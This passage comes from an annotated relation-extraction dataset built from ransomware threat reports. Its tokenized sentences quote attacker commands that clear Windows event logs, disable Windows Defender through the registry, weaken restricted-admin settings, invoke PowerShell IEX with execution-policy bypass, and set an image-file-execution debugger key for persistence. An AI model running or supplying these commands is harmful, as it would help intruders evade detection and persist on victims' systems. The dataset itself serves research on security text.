"sent_id": 1, "global_pos": [32, 32], "name": "adversary", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "attacker", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [66, 66], "name": "security logs", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [103, 103], "name": "adversary", "pos": [31, 32], "index": "3_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [110, 110], "name": "Windows Registry", "pos": [38, 40], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [122, 122], "name": "lateral movement", "pos": [50, 52], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [125, 125], "name": "privilege escalation activities", "pos": [53, 56], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [134, 134], "name": "attackers", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [138, 138], "name": "attacks", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [179, 179], "name": "attacker", "pos": [14, 15], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [181, 181], "name": "Windows Defender", "pos": [16, 18], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [186, 186], "name": "Windows Registry", "pos": [21, 23], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [241, 241], "name": "actor", "pos": [49, 50], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [255, 255], "name": "Windows Command Processor", "pos": [5, 8], "index": "13_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [262, 262], "name": "PowerShell", "pos": [12, 13], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [267, 267], "name": "Invoke-Expression", "pos": [17, 18], "index": "15_0"}]], "labels": [{"r": "RD", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "RD", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "UK", "evidence": [2], "h": 1, "t": 2}, {"r": "RD", "evidence": [3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 3, "t": 4}, {"r": "FR", "evidence": [3], "h": 3, "t": 5}, {"r": "FR", "evidence": [3], "h": 3, "t": 6}, {"r": "FR", "evidence": [4], "h": 7, "t": 8}, {"r": "RD", "evidence": [4, 5], "h": 8, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "UK", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 11}, {"r": "RD", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "RD", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "FR", "evidence": [6, 7], "h": 12, "t": 13}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}, {"r": "FR", "evidence": [7], "h": 14, "t": 15}]}, {"title": "075-25", "sents": [["001", ")", "Throughout", "the", "attack", ",", "the", "adversary", "made", "multiple", "attempts", "to", "evade", "detection", "and", "subvert", "security", "controls", "in", "place", "as", "described", "throughout", "previous", "sections", "of", "this", "blog", "post", "."], ["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."], ["Disabling", "this", "security", "control", "allows", "attackers", "to", "leverage", "pass-the-hash", "attacks", "and", "hinder", "RDP", "'s", "security", "on", "systems.cmd.exe", "/q", "/c", "powershell", "new-itemproperty", "-path", "hklm", ":", "\\system\\currentcontrolset\\control\\lsa", "-name", "disablerestrictedadmin", "-value", "0", "-propertytype", "dword", "-force", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1", "We", "also", "observed", "the", "attacker", "disabling", "Windows", "Defender", "by", "modifying", "the", "Windows", "Registry", "on", "compromised", "systems", "."], ["This", "was", "performed", "using", "the", "following", "commands", ":", "C", ":", "\\Windows\\system32", "eg.exe", "delete", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender", "/fC", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\Real-Time", "Protection", "/v", "DisableRoutinelyTakingAction", "/t", "REG_DWORD", "/d", "1", "/f", "C", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\SpyNet", "/v", "DisableBlockAtFirstSeen", "/t", "REG_DWORD", "/d", "1", "/f", "We", "also", "observed", "the", "threat", "actor", "attempting", "to", "evade", "detection", "while", "enumerating", "the", "e"], ["In", "this", "case", ",", "the", "Windows", "Command", "Processor", "was", "used", "to", "invoke", "PowerShell", ",", "which", "then", "leveraged", "Invoke-Expression", "(", "IEX", ")", "for", "this", "purpose.cmd.exe", "/Q", "/c", "powershell.exe", "-exec", "bypass", "-noni", "-nop", "-w", "1", "-C", "IEX", "(", "[", "Net", "."], ["This", "data", ",", "once", "exfiltrated", ",", "is", "published", "to", "attacker-controlled", "websites", "that", "are", "commonly", "referred", "to", "as", "``", "data", "leak", "sites", "''", "in", "situations", "where", "the", "victim", "chooses", "not", "to", "pay", "the", "ransom", "demand", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "adversary", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "attacker", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [41, 41], "name": "security logs", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [78, 78], "name": "adversary", "pos": [31, 32], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [85, 85], "name": "Windows Registry", "pos": [38, 40], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [97, 97], "name": "lateral movement", "pos": [50, 52], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [100, 100], "name": "privilege escalation activities", "pos": [53, 56], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [109, 109], "name": "attackers", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [113, 113], "name": "attacks", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [154, 154], "name": "attacker", "pos": [14, 15], "index": "9_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [156, 156], "name": "Windows Defender", "pos": [16, 18], "index": "10_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [161, 161], "name": "Windows Registry", "pos": [21, 23], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [216, 216], "name": "actor", "pos": [49, 50], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [230, 230], "name": "Windows Command Processor", "pos": [5, 8], "index": "13_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [237, 237], "name": "PowerShell", "pos": [12, 13], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [242, 242], "name": "Invoke-Expression", "pos": [17, 18], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [265, 265], "name": "data", "pos": [1, 2], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [274, 274], "name": "websites", "pos": [10, 11], "index": "17_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "UK", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 3, "t": 5}, {"r": "FR", "evidence": [2], "h": 3, "t": 6}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "RD", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "UK", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 9, "t": 11}, {"r": "RD", "evidence": [4, 5], "t": 11, "h": 12}, {"r": "RD", "evidence": [4, 5], "t": 11, "h": 12}, {"r": "WR", "evidence": [4, 5], "t": 11, "h": 12}, {"r": "FR", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "FR", "evidence": [6], "h": 13, "t": 14}, {"r": "FR", "evidence": [6], "h": 14, "t": 15}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 16}, {"r": "ST", "evidence": [6, 7], "h": 13, "t": 17}]}, {"title": "075-26", "sents": [["We", "also", "observed", "the", "attacker", "attempting", "to", "clear", "the", "contents", "of", "security", "logs", "on", "compromised", "systems", "."], ["The", "following", "command-line", "syntax", "was", "observed", "being", "used", "to", "clear", "the", "System", ",", "Security", "and", "Application", "Windows", "Event", "Logs.c", ":", "\\windows\\system32\\wevtutil.exe", "cl", "systemc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "securityc", ":", "\\windows\\system32\\wevtutil.exe", "cl", "applicationThe", "adversary", "was", "also", "observed", "remotely", "modifying", "the", "Windows", "Registry", "on", "remote", "systems", "to", "disable", "remote", "administration", "restrictions", "to", "facilitate", "lateral", "movement", "and", "privilege", "escalation", "activities", "."], ["Disabling", "this", "security", "control", "allows", "attackers", "to", "leverage", "pass-the-hash", "attacks", "and", "hinder", "RDP", "'s", "security", "on", "systems.cmd.exe", "/q", "/c", "powershell", "new-itemproperty", "-path", "hklm", ":", "\\system\\currentcontrolset\\control\\lsa", "-name", "disablerestrictedadmin", "-value", "0", "-propertytype", "dword", "-force", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1", "We", "also", "observed", "the", "attacker", "disabling", "Windows", "Defender", "by", "modifying", "the", "Windows", "Registry", "on", "compromised", "systems", "."], ["This", "was", "performed", "using", "the", "following", "commands", ":", "C", ":", "\\Windows\\system32", "eg.exe", "delete", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender", "/fC", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\Real-Time", "Protection", "/v", "DisableRoutinelyTakingAction", "/t", "REG_DWORD", "/d", "1", "/f", "C", ":", "\\Windows\\system32", "eg.exe", "add", "HKLM\\Software\\Policies\\Microsoft\\Windows", "Defender\\SpyNet", "/v", "DisableBlockAtFirstSeen", "/t", "REG_DWORD", "/d", "1", "/f", "We", "also", "observed", "the", "threat", "actor", "attempting", "to", "evade", "detection", "while", "enumerating", "the", "e"], ["In", "this", "case", ",", "the", "Windows", "Command", "Processor", "was", "used", "to", "invoke", "PowerShell", ",", "which", "then", "leveraged", "Invoke-Expression", "(", "IEX", ")", "for", "this", "purpose.cmd.exe", "/Q", "/c", "powershell.exe", "-exec", "bypass", "-noni", "-nop", "-w", "1", "-C", "IEX", "(", "[", "Net", "."], ["This", "data", ",", "once", "exfiltrated", ",", "is", "published", "to", "attacker-controlled", "websites", "that", "are", "commonly", "referred", "to", "as", "``", "data", "leak", "sites", "''", "in", "situations", "where", "the", "victim", "chooses", "not", "to", "pay", "the", "ransom", "demand", "."], ["In", "this", "attack", ",", "we", "observed", "the", "adversary", "attempting", "to", "exfiltrate", "sensitive", "information", "over", "SMB", "(", "TCP/445", ")", "directly", "from", "a", "compromised", "domain", "controller", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "attacker", "pos": [4, 5], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [11, 11], "name": "security logs", "pos": [11, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [48, 48], "name": "adversary", "pos": [31, 32], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [55, 55], "name": "Windows Registry", "pos": [38, 40], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [67, 67], "name": "lateral movement", "pos": [50, 52], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [70, 70], "name": "privilege escalation activities", "pos": [53, 56], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [79, 79], "name": "attackers", "pos": [5, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [83, 83], "name": "attacks", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [124, 124], "name": "attacker", "pos": [14, 15], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [126, 126], "name": "Windows Defender", "pos": [16, 18], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [131, 131], "name": "Windows Registry", "pos": [21, 23], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [186, 186], "name": "actor", "pos": [49, 50], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [200, 200], "name": "Windows Command Processor", "pos": [5, 8], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [207, 207], "name": "PowerShell", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [212, 212], "name": "Invoke-Expression", "pos": [17, 18], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [235, 235], "name": "data", "pos": [1, 2], "index": "15_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [244, 244], "name": "websites", "pos": [10, 11], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [271, 271], "name": "attack", "pos": [2, 3], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [280, 280], "name": "sensitive information", "pos": [11, 13], "index": "18_0"}]], "labels": [{"r": "UK", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1], "h": 2, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2, 3], "h": 7, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "UK", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 10}, {"r": "RD", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "RD", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "WR", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "FR", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "FR", "evidence": [5], "h": 12, "t": 13}, {"r": "FR", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5, 6], "h": 12, "t": 15}, {"r": "ST", "evidence": [5, 6], "h": 12, "t": 16}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}]}, {"title": "029-0", "sents": [["In", "the", "BlackMatter", "attack", ",", "the", "perpetrator", "potentially", "exploited", "vulnerabilities", "in", "Microsoft", "Exchange", "to", "gain", "initial", "access", "."], ["Once", "inside", ",", "the", "attackers", "ensured", "additional", "remote", "access", "to", "several", "internal", "systems", "beyond", "the", "first", "vector", "of", "exploitation", "."], ["Meanwhile", ",", "during", "the", "BlackCat", "attack", ",", "reverse-ssh", "was", "the", "tool", "employed", "by", "the", "actors", "."], ["With", "the", "C2", "server", "address", "embedded", ",", "they", "used", "it", "for", "setting", "up", "reverse", "SSH", "tunnels", "and", "providing", "reverse", "shells", "to", "the", "attacker", "."], ["Reverse-ssh", "was", "named", "as", "``", "system", "''", ",", "``", "Windows", "''", "or", "``", "cache", "task", "''", ",", "and", "deployed", "to", "the", "C", ":", "\\", "directory", "."], ["Additionally", ",", "the", "attackers", "hid", "it", "using", "an", "alternate", "data", "stream", "(", "ADS", ")", "of", "the", "same", "directory", "with", "a", "specific", "command", "."], ["The", "command", "is", "as", "follows", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "vulnerabilities in Microsoft Exchange", "pos": [9, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "attackers", "pos": [4, 5], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "actors", "pos": [14, 15], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [56, 56], "name": "C2 server", "pos": [2, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "they", "pos": [7, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "reverse SSH", "pos": [13, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [107, 107], "name": "attackers", "pos": [3, 4], "index": "7_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "RF", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 7}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}]}, {"title": "029-1", "sents": [["Once", "inside", ",", "the", "attackers", "ensured", "additional", "remote", "access", "to", "several", "internal", "systems", "beyond", "the", "first", "vector", "of", "exploitation", "."], ["Meanwhile", ",", "during", "the", "BlackCat", "attack", ",", "reverse-ssh", "was", "the", "tool", "employed", "by", "the", "actors", "."], ["With", "the", "C2", "server", "address", "embedded", ",", "they", "used", "it", "for", "setting", "up", "reverse", "SSH", "tunnels", "and", "providing", "reverse", "shells", "to", "the", "attacker", "."], ["Reverse-ssh", "was", "named", "as", "``", "system", "''", ",", "``", "Windows", "''", "or", "``", "cache", "task", "''", ",", "and", "deployed", "to", "the", "C", ":", "\\", "directory", "."], ["Additionally", ",", "the", "attackers", "hid", "it", "using", "an", "alternate", "data", "stream", "(", "ADS", ")", "of", "the", "same", "directory", "with", "a", "specific", "command", "."], ["The", "command", "is", "as", "follows", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "attackers", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "actors", "pos": [14, 15], "index": "1_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [38, 38], "name": "C2 server", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "they", "pos": [7, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "reverse SSH", "pos": [13, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "attackers", "pos": [3, 4], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [133, 133], "name": "attackers", "pos": [12, 13], "index": "6_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [146, 146], "name": "registry", "pos": [25, 26], "index": "7_0"}]], "labels": [{"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [7], "h": 6, "t": 7}]}, {"title": "029-2", "sents": [["Meanwhile", ",", "during", "the", "BlackCat", "attack", ",", "reverse-ssh", "was", "the", "tool", "employed", "by", "the", "actors", "."], ["With", "the", "C2", "server", "address", "embedded", ",", "they", "used", "it", "for", "setting", "up", "reverse", "SSH", "tunnels", "and", "providing", "reverse", "shells", "to", "the", "attacker", "."], ["Reverse-ssh", "was", "named", "as", "``", "system", "''", ",", "``", "Windows", "''", "or", "``", "cache", "task", "''", ",", "and", "deployed", "to", "the", "C", ":", "\\", "directory", "."], ["Additionally", ",", "the", "attackers", "hid", "it", "using", "an", "alternate", "data", "stream", "(", "ADS", ")", "of", "the", "same", "directory", "with", "a", "specific", "command", "."], ["The", "command", "is", "as", "follows", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."], ["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "actors", "pos": [14, 15], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [18, 18], "name": "C2 server", "pos": [2, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "they", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "reverse SSH", "pos": [13, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "attackers", "pos": [3, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [113, 113], "name": "attackers", "pos": [12, 13], "index": "5_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [126, 126], "name": "registry", "pos": [25, 26], "index": "6_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [6], "h": 5, "t": 6}]}, {"title": "029-3", "sents": [["With", "the", "C2", "server", "address", "embedded", ",", "they", "used", "it", "for", "setting", "up", "reverse", "SSH", "tunnels", "and", "providing", "reverse", "shells", "to", "the", "attacker", "."], ["Reverse-ssh", "was", "named", "as", "``", "system", "''", ",", "``", "Windows", "''", "or", "``", "cache", "task", "''", ",", "and", "deployed", "to", "the", "C", ":", "\\", "directory", "."], ["Additionally", ",", "the", "attackers", "hid", "it", "using", "an", "alternate", "data", "stream", "(", "ADS", ")", "of", "the", "same", "directory", "with", "a", "specific", "command", "."], ["The", "command", "is", "as", "follows", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."], ["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."], ["Specifically", ",", "the", "command", "used", "was", ":"]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [2, 2], "name": "C2 server", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "they", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "reverse SSH", "pos": [13, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "attackers", "pos": [3, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "attackers", "pos": [12, 13], "index": "4_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [110, 110], "name": "registry", "pos": [25, 26], "index": "5_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [5], "h": 4, "t": 5}]}, {"title": "029-4", "sents": [["Reverse-ssh", "was", "named", "as", "``", "system", "''", ",", "``", "Windows", "''", "or", "``", "cache", "task", "''", ",", "and", "deployed", "to", "the", "C", ":", "\\", "directory", "."], ["Additionally", ",", "the", "attackers", "hid", "it", "using", "an", "alternate", "data", "stream", "(", "ADS", ")", "of", "the", "same", "directory", "with", "a", "specific", "command", "."], ["The", "command", "is", "as", "follows", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."], ["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."], ["Specifically", ",", "the", "command", "used", "was", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "attackers", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [73, 73], "name": "attackers", "pos": [12, 13], "index": "1_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [86, 86], "name": "registry", "pos": [25, 26], "index": "2_0"}]], "labels": [{"r": "WR", "evidence": [4], "h": 1, "t": 2}]}, {"title": "029-5", "sents": [["Additionally", ",", "the", "attackers", "hid", "it", "using", "an", "alternate", "data", "stream", "(", "ADS", ")", "of", "the", "same", "directory", "with", "a", "specific", "command", "."], ["The", "command", "is", "as", "follows", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."], ["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."], ["Specifically", ",", "the", "command", "used", "was", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "attackers", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [47, 47], "name": "attackers", "pos": [12, 13], "index": "1_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [60, 60], "name": "registry", "pos": [25, 26], "index": "2_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [114, 114], "name": "BlackMatter attack", "pos": [2, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [118, 118], "name": "group", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [124, 124], "name": "GOST", "pos": [12, 13], "index": "5_0"}]], "labels": [{"r": "WR", "evidence": [3], "h": 1, "t": 2}, {"r": "WR", "evidence": [7], "h": 4, "t": 5}, {"r": "CO", "evidence": [7], "h": 3, "t": 4}]}, {"title": "029-6", "sents": [["The", "command", "is", "as", "follows", ":"], ["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."], ["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."], ["Specifically", ",", "the", "command", "used", "was", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [24, 24], "name": "attackers", "pos": [12, 13], "index": "0_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [37, 37], "name": "registry", "pos": [25, 26], "index": "1_0"}], [{"type": "MP", "sent_id": 